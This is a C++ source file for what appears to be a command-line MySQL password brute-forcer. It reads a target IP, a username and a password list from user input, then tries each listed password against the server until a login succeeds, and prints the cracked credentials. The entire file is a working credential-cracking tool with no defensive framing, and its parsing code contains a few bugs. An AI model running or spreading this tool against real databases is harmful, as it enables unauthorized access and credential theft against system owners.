// Author: https://github.com/3nt3r3
// Documentation is in "docs.txt"

#include "head.h"
#include "menu-help.h"
// Including necessary head-file

int main()
{
    std::cout << menu;
    std::string command;
    do
    {
        std::string part_command;
        std::cout << prompt;
        std::getline(std::cin, command);
        if (command == "help")
        {
            help();
        }
        
        std::string IP;
        std::string name_or_file;
        std::string passes;
        int ip_check = 0;
        int ip_iter = 0;
        std::string usr_check = "text";
        int usr_iter;
        int pass_iter;
        // Grab IP

        for (ip_iter; ip_iter < command.size(); ip_iter++)
        {
            part_command += command[ip_iter];
            if (command[ip_iter + 1] == ' ' && ip_check == 0)
            {
                IP = part_command;
                part_command.clear();
                usr_iter = ip_iter + 2;
                break;
            }
        }
        // Grab username

        for (usr_iter; usr_iter < command.size(); usr_iter++)
        {
            part_command += command[usr_iter];
            if (part_command == "-U " && usr_check == "text")
            {
                usr_check = "Username: ";
                part_command.clear();
                continue;
            }
            else if (command[usr_iter + 1] == '\'')
            {
                name_or_file = part_command;
                pass_iter = usr_iter + 3;
                part_command.clear();
                break;
            }
        }

        // Grab place with passes
        for (pass_iter; pass_iter < command.size(); pass_iter++)
        {
            part_command += command[pass_iter];
            if (part_command == "-P ")
            {
                part_command.clear();
            }
            else if (command[pass_iter + 1] == '\'')
            {
                passes = part_command;
                part_command.clear();
                break;
            }
        }

        std::cout << "| Cracking with:\n| IP - " << IP << "\n| " << usr_check << name_or_file << "\n| Passlist: " << passes << "\n";
        if (usr_check == "Username: ")
        {
            std::ifstream file_pass;
            file_pass.open(passes, std::ios::out);
            if (!file_pass)
            {
                std::cout << "Can not open " << passes << "\n";
                exit(1);
            }
            std::string cont_pass;
            long count = 0;
            while (std::getline(file_pass, cont_pass)) 
            {
                // Start connection
                sql::mysql::MySQL_Driver *driver;
                sql::Connection *con;

                try
                {
                    driver = sql::mysql::get_mysql_driver_instance();
                    con = driver->connect(IP, name_or_file, cont_pass);
                    sql::Statement *stmt;
                    stmt = con->createStatement();
                    sql::ResultSet *res = stmt->executeQuery("SELECT 'Welcome in MySQL' as welcome_message");
                    if (res->next())
                    {
                        std::cout << "Pasword been cracked:\nLogin " << name_or_file << " Password: " << cont_pass << "\n";
                        delete res, stmt, con;
                        file_pass.close();
                        break;
                    }
                }
                catch (sql::SQLException &e)
                {
                    std::cerr << "| " << count + 1 << ". " << cont_pass << " is incorrect\n";
                }
                count++;
            }
            if (count == 0)
            {
                std::cout << "File is empty\n";
            }
        }
    } while (command != "exit");
    std::cout << "See you ;)\n";
    return 0;
}